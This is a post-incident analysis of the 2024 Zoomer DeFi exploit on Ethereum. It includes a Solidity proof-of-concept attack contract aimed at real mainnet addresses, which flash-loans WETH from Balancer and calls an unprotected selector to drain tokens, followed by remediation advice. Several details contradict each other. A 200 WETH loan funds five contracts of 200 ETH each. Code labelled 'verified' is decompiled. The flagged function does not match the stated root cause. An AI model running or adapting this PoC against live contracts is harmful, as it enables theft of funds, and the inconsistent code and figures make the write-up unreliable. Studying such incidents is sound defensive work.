# Zoomer — Flash Loan-Based Arbitrary Selector 0x72c4cff6 Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | Zoomer |
| **Chain** | Ethereum |
| **Loss** | ~14 ETH |
| **Zoomer Token** | [0x0D505C03](https://etherscan.io/address/0x0D505C03d30e65f6e9b4Ef88855a47a89e4b7676) |
| **Vulnerable Contract** | [0x9700204D](https://etherscan.io/address/0x9700204D77A67A18eA8F1B47275897b21e5eFA97) |
| **Balancer Vault** | [0xBA122222](https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8) |
| **Root Cause** | The `0x72c4cff6` selector function in the vulnerable contract lacks access control, allowing any arbitrary caller to execute internal operations with token + amount parameters to drain funds |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Zoomer_exp.sol) |

---

## 1. Vulnerability Overview

The vulnerable contract in the Zoomer protocol exposes an unverified function corresponding to selector `0x72c4cff6`. The attacker flash-loaned 200 WETH from Balancer, deployed 5 intermediate contracts (Money), swapped WETH to Zoomer in each, then called `0x72c4cff6(address token, uint256 amount)` to exploit internal logic and drain ~14 ETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: internal function exposed without access control
// Selector 0x72c4cff6 — accepts token + amount parameters
// Function name unknown (unverified contract)
function unknownFunction(address token, uint256 amount) external {
    // No msg.sender validation
    // Internal state change or token transfer logic
    IERC20(token).transfer(msg.sender, amount);  // ← unauthorized token withdrawal possible
}

// ✅ Safe code: callable by owner only
function adminWithdraw(address token, uint256 amount) external onlyOwner {
    IERC20(token).transfer(msg.sender, amount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Zoomer_decompiled.sol
contract Zoomer {
    function liq(address p0) external {}  // ❌ Vulnerability

    // Selector: 0x619c7e5f
    function unknown_619c7e5f() external {}

    // Selector: 0x72c4cff6
    function unknown_72c4cff6() external {}

    // Selector: 0x73b4086b
    function loans(address p0) external {}

    // Selector: 0x76ce28f1
    function setWhitelistedToken(address p0, bool p1) external {}

    // Selector: 0x7924d93f
    function borrowers(uint256 p0) external {}

    // Selector: 0x630838c1
    function unknown_630838c1() external {}

    // Selector: 0x6e04ff0d
    function checkUpkeep(bytes memory p0) external view returns (uint256) {}

    // Selector: 0x4585e33b
    function performUpkeep(bytes memory p0) external {}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Balancer flash: flash loan 200 WETH
  │
  ├─→ [2] Deploy 5 Money contracts (each worth 200 ETH)
  │
  ├─→ [3] Each Money: swap WETH → Zoomer (UniswapV2 Router)
  │         └─ Total ~30,265,400 Zoomer tokens acquired
  │
  ├─→ [4] Call vulnerable contract 0x72c4cff6(Zoomer, 30265400)
  │         └─ Internal logic executed without access control
  │
  ├─→ [5] Tokens and ETH returned to attacker
  │
  ├─→ [6] Repay Balancer flash loan
  │
  └─→ [7] ~14 ETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IVulnerable {
    // Selector 0x72c4cff6
    function unknownFunc(address token, uint256 amount) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract AttackContract {
    IVulnerable    constant vuln    = IVulnerable(0x9700204D77A67A18eA8F1B47275897b21e5eFA97);
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20         constant ZOOMER  = IERC20(0x0D505C03d30e65f6e9b4Ef88855a47a89e4b7676);
    IWETH          constant WETH    = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testExploit() external {
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(WETH);
        amounts[0] = 200 ether;
        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        // [1] Deploy 5 Money contracts and swap to Zoomer
        for (uint i = 0; i < 5; i++) {
            Money money = new Money{value: 200 ether}();
            money.swapToZoomer();
        }

        // [2] Call vulnerable function — no access control
        uint256 zoomerBal = ZOOMER.balanceOf(address(this));
        (bool ok,) = address(vuln).call(
            abi.encodeWithSelector(0x72c4cff6, address(ZOOMER), zoomerBal)
        );
        require(ok);

        // [3] Repay flash loan
        WETH.transfer(address(balancer), amounts[0]);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (flash loan + direct arbitrary selector call) |
| **DApp Category** | Unverified DeFi contract |
| **Impact** | Unauthorized withdrawal of internal assets |

## 6. Remediation Recommendations

1. **Access control on all external functions**: Apply `onlyOwner` or `onlyAuthorized` modifiers
2. **Verified contract deployment**: Document and audit access permissions for all functions before deployment
3. **Remove unverified selectors**: Delete unverified functions that expose unknown selectors
4. **Protect token withdrawal functions**: Any function that moves tokens must be restricted to owner only

## 7. Lessons Learned

- Visibility and access control of all functions must be explicitly audited before contract deployment.
- Exposing selectors from unverified contracts carries an immediate risk of asset drainage.
- When combined with flash loans, even minor vulnerabilities can be amplified into losses worth tens of ETH.